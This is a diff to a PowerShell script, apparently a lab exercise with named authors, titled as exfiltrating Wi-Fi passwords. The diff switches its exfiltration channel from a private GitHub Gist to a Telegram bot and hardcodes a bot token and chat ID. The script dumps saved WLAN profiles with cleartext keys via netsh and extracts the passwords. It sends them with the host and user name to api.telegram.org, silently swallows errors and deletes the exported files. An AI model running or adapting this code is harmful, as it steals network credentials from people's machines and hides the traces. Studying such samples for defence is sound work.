@@ -1,51 +1,68 @@
 # ============================================================
 #  W02a.6 – WLAN-Passwörter exfiltrieren
 #  Autoren: Raphael Bleier, Joachim Lugger
-#  Exfiltration: Privates GitHub Gist (kein lokaler Server)
-#
-#  Setup: GITHUB_PAT durch eigenen Token ersetzen (Scope: gist)
+#  Exfiltration: Telegram Bot
 # ============================================================
 
-$GITHUB_PAT = "GITHUB_PAT_HERE"
+$BOT_TOKEN = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
+$CHAT_ID   = "1780237079"
 
-$tmpDir = $env:TEMP
-Push-Location $tmpDir
+function Send-TgMessage {
+    param([string]$Text)
+    try {
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
+            -Method POST -Body @{ chat_id = $CHAT_ID; text = $Text } | Out-Null
+    } catch { }
+}
 
+function Send-TgFile {
+    param([string]$Filename, [string]$Content, [string]$Caption = "")
+    try {
+        $enc      = [System.Text.Encoding]::UTF8
+        $boundary = [System.Guid]::NewGuid().ToString("N")
+        $CRLF     = "`r`n"
+        $header   = $enc.GetBytes(
+            "--$boundary$CRLF" +
+            "Content-Disposition: form-data; name=`"chat_id`"$CRLF$CRLF$CHAT_ID$CRLF" +
+            "--$boundary$CRLF" +
+            "Content-Disposition: form-data; name=`"caption`"$CRLF$CRLF$Caption$CRLF" +
+            "--$boundary$CRLF" +
+            "Content-Disposition: form-data; name=`"document`"; filename=`"$Filename`"$CRLF" +
+            "Content-Type: text/plain; charset=utf-8$CRLF$CRLF"
+        )
+        $body = $header + $enc.GetBytes($Content) + $enc.GetBytes("$CRLF--$boundary--$CRLF")
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" `
+            -Method POST `
+            -ContentType "multipart/form-data; boundary=$boundary" `
+            -Body $body | Out-Null
+    } catch { }
+}
+
+# ── WLAN-Passwörter sammeln ───────────────────────────────────
+
+Send-TgMessage "🔑 [WIFI GRAB] $env:COMPUTERNAME\$env:USERNAME gestartet"
+
+Push-Location $env:TEMP
 try {
-    # WLAN-Profile mit Klartextpasswörtern exportieren
     netsh wlan export profile key=clear | Out-Null
 
-    # <keyMaterial> = Passwort im Klartext
     $passwords = Select-String -Path "Wi-Fi-*.xml" -Pattern "<keyMaterial>(.*)</keyMaterial>" |
                  ForEach-Object {
                      $ssid = $_.Filename -replace "Wi-Fi-|\.xml", ""
                      $pass = $_.Matches.Groups[1].Value
-                     "SSID: $ssid | Passwort: $pass"
+                     "SSID: $ssid  |  Passwort: $pass"
                  }
+
+    if (-not $passwords) { $passwords = @("(keine WLAN-Profile mit Passwort gefunden)") }
 
     $report = "=== WIFI PASSWORDS | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===`n" +
               "Host: $env:COMPUTERNAME | User: $env:USERNAME`n`n" +
               ($passwords -join "`n")
 
-    # Exfil via privates GitHub Gist
-    $headers = @{
-        "Authorization" = "token $GITHUB_PAT"
-        "Content-Type"  = "application/json"
-        "User-Agent"    = "git/2.40.0"
-    }
-    $body = @{
-        description = "wifi_$(Get-Date -Format 'yyyyMMdd_HHmm')"
-        public      = $false
-        files       = @{ "wifi.txt" = @{ content = $report } }
-    } | ConvertTo-Json -Depth 5
-
-    try {
-        Invoke-RestMethod -Uri "https://api.github.com/gists" `
-            -Method POST -Headers $headers -Body $body | Out-Null
-    } catch { }
-
+    Send-TgFile -Filename "wifi_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
+                -Content $report `
+                -Caption "📶 WiFi Passwords – $env:COMPUTERNAME ($($passwords.Count) SSIDs)"
 } finally {
-    # Spuren verwischen
     Remove-Item "Wi-Fi-*.xml" -Force -ErrorAction SilentlyContinue
     Pop-Location
 }
